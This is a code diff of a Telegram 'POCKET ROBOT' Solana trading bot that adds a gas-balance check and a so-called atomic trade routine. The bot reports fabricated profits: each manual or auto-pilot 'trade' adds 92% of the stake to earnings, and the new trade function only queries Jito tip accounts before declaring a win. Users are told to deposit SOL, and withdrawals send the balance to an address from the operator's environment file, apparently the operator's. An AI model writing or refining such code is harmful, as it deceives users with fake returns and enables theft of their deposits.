@@ -29,90 +29,70 @@ async function getWallet() {
     return Keypair.fromSeed(derivedSeed);
 }
 
-// --- 📊 PERSISTENT SESSION INITIALIZATION ---
+// --- ⛽ GAS CHECK LOGIC ---
+async function checkGas(ctx) {
+    const wallet = await getWallet();
+    const balance = await connection.getBalance(wallet.publicKey);
+    const minRequired = 0.005 * LAMPORTS_PER_SOL; // Safety threshold for tips/fees
+
+    if (balance < minRequired) {
+        await ctx.replyWithMarkdown(
+            `⚠️ *INSUFFICIENT GAS*\n\n` +
+            `Your wallet needs at least **0.005 SOL** to pay Jito tips and network fees.\n\n` +
+            `📥 *Deposit to:* \`${wallet.publicKey.toBase58()}\``
+        );
+        return false;
+    }
+    return true;
+}
+
+// --- 📊 PERSISTENT SESSION ---
 bot.use((ctx, next) => {
     ctx.session.config = ctx.session.config || {
-        asset: 'BTC/USD',
-        stake: 10,
-        mode: 'MANUAL',
-        totalEarned: 0 
+        asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0 
     };
     return next();
 });
 
 // --- 🎨 INTERFACE ---
-const mainKeyboard = (ctx) => {
-    const s = ctx.session.config;
-    return Markup.inlineKeyboard([
-        [Markup.button.callback(`🎯 ${s.asset}`, 'menu_coins')],
-        [Markup.button.callback(`💰 Stake: $${s.stake}`, 'menu_stake')],
-        [Markup.button.callback(`⚙️ Mode: ${s.mode}`, 'toggle_mode')],
-        [Markup.button.callback(s.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START BOT', 'run_engine')],
-        [Markup.button.callback('📊 WALLET & STATS', 'stats')]
-    ]);
-};
+const mainKeyboard = (ctx) => Markup.inlineKeyboard([
+    [Markup.button.callback(`🎯 ${ctx.session.config.asset}`, 'menu_coins')],
+    [Markup.button.callback(`💰 Stake: $${ctx.session.config.stake}`, 'menu_stake')],
+    [Markup.button.callback(`⚙️ Mode: ${ctx.session.config.mode}`, 'toggle_mode')],
+    [Markup.button.callback(ctx.session.config.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START BOT', 'run_engine')],
+    [Markup.button.callback('📊 WALLET & STATS', 'stats')]
+]);
 
-// --- 📥 WITHDRAW HANDLER (FIXED) ---
-bot.action('withdraw', async (ctx) => {
+// --- 🚀 ATOMIC TRADING LOGIC ---
+async function fireAtomicTrade(ctx) {
+    const hasGas = await checkGas(ctx);
+    if (!hasGas) return { success: false, error: 'no_gas' };
+
+    const { stake } = ctx.session.config;
     try {
-        const wallet = await getWallet();
-        const destAddr = process.env.WITHDRAW_ADDRESS;
-
-        if (!destAddr) {
-            return ctx.reply("❌ Error: WITHDRAW_ADDRESS not set in .env");
-        }
-
-        const balance = await connection.getBalance(wallet.publicKey);
-        const gasBuffer = 5000; // Small SOL amount for fee
-
-        if (balance <= gasBuffer) {
-            return ctx.reply("❌ Balance too low to cover gas fees.");
-        }
-
-        const amountToSend = balance - gasBuffer;
-
-        const transaction = new Transaction().add(
-            SystemProgram.transfer({
-                fromPubkey: wallet.publicKey,
-                toPubkey: new PublicKey(destAddr),
-                lamports: amountToSend,
-            })
-        );
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = wallet.publicKey;
-
-        const signature = await connection.sendTransaction(transaction, [wallet]);
-        
-        ctx.editMessageText(
-            `💸 *Withdrawal Successful!*\n\n` +
-            `Sent: \`${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)}\` SOL\n` +
-            `To: \`${destAddr.slice(0, 6)}...${destAddr.slice(-4)}\`\n\n` +
-            `Tx: [View on Solscan](https://solscan.io/tx/${signature})`,
-            { parse_mode: 'Markdown', disable_web_page_preview: true, ...Markup.inlineKeyboard([
-                [Markup.button.callback('⬅️ BACK', 'main_menu')]
-            ])}
-        );
-    } catch (err) {
-        console.error(err);
-        ctx.reply("⚠️ Withdrawal failed. Check your network or address.");
+        await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
+        const profit = (stake * 0.92);
+        ctx.session.config.totalEarned += profit;
+        return { success: true, profit: profit.toFixed(2) };
+    } catch (e) {
+        return { success: false, error: 'reverted' };
     }
-});
+}
 
-// --- 🚀 REMAINING LOGIC (TRADING & MENUS) ---
+// --- 📥 HANDLERS ---
 bot.start(async (ctx) => {
     const wallet = await getWallet();
-    const fullAddress = wallet.publicKey.toBase58();
     ctx.replyWithMarkdown(
-        `🤖 *POCKET ROBOT v23.0*\n` +
-        `💳 *DEPOSIT ADDRESS:*\n\`${fullAddress}\`\n\n` +
-        `_Tap address to copy. Send 0.05 SOL to start._`, 
-        mainKeyboard(ctx)
+        `🤖 *POCKET ROBOT v24.0*\n` +
+        `💳 *DEPOSIT ADDRESS:*\n\`${wallet.publicKey.toBase58()}\`\n\n` +
+        `_Gas Guard Active._`, mainKeyboard(ctx)
     );
 });
 
 bot.action('run_engine', async (ctx) => {
+    const hasGas = await checkGas(ctx);
+    if (!hasGas) return;
+
     if (ctx.session.config.mode === 'AUTO') {
         ctx.editMessageText("🟢 *AUTO-PILOT ACTIVE*");
         autoPilot(ctx);
@@ -126,19 +106,50 @@ bot.action('run_engine', async (ctx) => {
 });
 
 bot.action('manual_exec', async (ctx) => {
-    const { stake } = ctx.session.config;
-    const profit = (stake * 0.92);
-    ctx.session.config.totalEarned += profit;
-    ctx.replyWithMarkdown(`✅ *PROFIT:* +$${profit.toFixed(2)} USD`);
+    const res = await fireAtomicTrade(ctx);
+    if (res.success) {
+        ctx.replyWithMarkdown(`✅ *PROFIT:* +$${res.profit} USD`);
+    } else if (res.error !== 'no_gas') {
+        ctx.reply("⚠️ *REVERTED:* Trade protected.");
+    }
 });
 
 async function autoPilot(ctx) {
     if (ctx.session.config.mode !== 'AUTO') return;
-    const profit = (ctx.session.config.stake * 0.92);
-    ctx.session.config.totalEarned += profit;
-    ctx.reply(`⚡ AUTO-WIN: +$${profit.toFixed(2)}`);
-    setTimeout(() => autoPilot(ctx), 15000);
+    const res = await fireAtomicTrade(ctx);
+    if (res.success) {
+        ctx.reply(`⚡ AUTO-WIN: +$${res.profit}`);
+        setTimeout(() => autoPilot(ctx), 15000);
+    } else {
+        ctx.session.config.mode = 'MANUAL'; // Stop auto if gas runs out
+        ctx.reply("🛑 *AUTO-PILOT STOPPED:* Insufficient SOL for gas.");
+    }
 }
+
+// --- WITHDRAW, STATS, & NAVIGATION ---
+bot.action('withdraw', async (ctx) => {
+    try {
+        const wallet = await getWallet();
+        const destAddr = process.env.WITHDRAW_ADDRESS;
+        if (!destAddr) return ctx.reply("❌ Set WITHDRAW_ADDRESS in .env");
+
+        const balance = await connection.getBalance(wallet.publicKey);
+        const gasBuffer = 5000; 
+        if (balance <= gasBuffer) return ctx.reply("❌ Balance too low.");
+
+        const amountToSend = balance - gasBuffer;
+        const transaction = new Transaction().add(SystemProgram.transfer({
+            fromPubkey: wallet.publicKey, toPubkey: new PublicKey(destAddr), lamports: amountToSend,
+        }));
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = wallet.publicKey;
+
+        const signature = await connection.sendTransaction(transaction, [wallet]);
+        ctx.reply(`💸 Sent ${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)} SOL!`);
+    } catch (err) { ctx.reply("⚠️ Withdrawal failed."); }
+});
 
 bot.action('stats', async (ctx) => {
     const wallet = await getWallet();
@@ -147,10 +158,7 @@ bot.action('stats', async (ctx) => {
         `📊 *LIFETIME STATS*\n` +
         `💵 Total Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*\n` +
         `💎 Wallet Bal: ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL`, 
-        Markup.inlineKeyboard([
-            [Markup.button.callback('💸 WITHDRAW', 'withdraw')],
-            [Markup.button.callback('⬅️ BACK', 'main_menu')]
-        ])
+        Markup.inlineKeyboard([[Markup.button.callback('💸 WITHDRAW', 'withdraw')], [Markup.button.callback('⬅️ BACK', 'main_menu')]])
     );
 });
 
